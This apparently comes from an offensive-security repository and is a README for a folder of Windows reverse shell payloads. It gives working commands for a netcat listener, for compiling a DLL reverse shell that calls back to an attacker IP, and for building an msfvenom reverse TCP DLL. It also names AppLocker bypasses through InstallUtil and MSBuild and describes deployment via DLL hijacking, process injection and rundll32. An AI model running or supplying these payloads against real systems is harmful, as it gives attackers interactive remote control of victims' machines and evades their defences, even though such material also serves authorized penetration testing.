# Reverse Shell Payloads

TCP callback shells for post-exploitation. Use after confirming code execution with a calc-pop PoC.

**Severity**: CRITICAL (confirms full RCE with interactive access)

## Files

| File | Description |
|------|-------------|
| [`dll_revshell.c`](dll_revshell.c) | C DLL — reverse shell on `DllMain` load. Edit `ATTACKER_IP` and `ATTACKER_PORT` before compiling |
| [`powershell_revshell.ps1`](powershell_revshell.ps1) | PowerShell TCP reverse shell + one-liner variants for embedding in exploits |
| [`csharp_revshell.cs`](csharp_revshell.cs) | C# reverse shell — compile with `csc.exe` (no deps). Includes InstallUtil bypass for AppLocker |
| [`msbuild_revshell.xml`](msbuild_revshell.xml) | MSBuild inline C# reverse shell — LOLBIN execution, bypasses AppLocker default rules |
| [`msfvenom_commands.md`](msfvenom_commands.md) | Quick reference for generating DLL, EXE, and shellcode payloads with msfvenom |

## Quick Start

### 1. Start Listener
```bash
nc -lvnp 4444
# or with readline
rlwrap nc -lvnp 4444
```

### 2. Build DLL Reverse Shell
Edit `dll_revshell.c` — set your IP and port:
```c
#define ATTACKER_IP   "10.10.14.1"
#define ATTACKER_PORT  4444
```
```bash
x86_64-w64-mingw32-gcc -shared -o revshell.dll dll_revshell.c -lws2_32
```

### 3. Or Use msfvenom
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f dll -o revshell.dll
```

### 4. Deploy
Use the reverse shell DLL as a drop-in replacement wherever a calc-pop DLL worked:
- DLL hijack path
- Process injection payload
- rundll32: `rundll32.exe revshell.dll,Run`
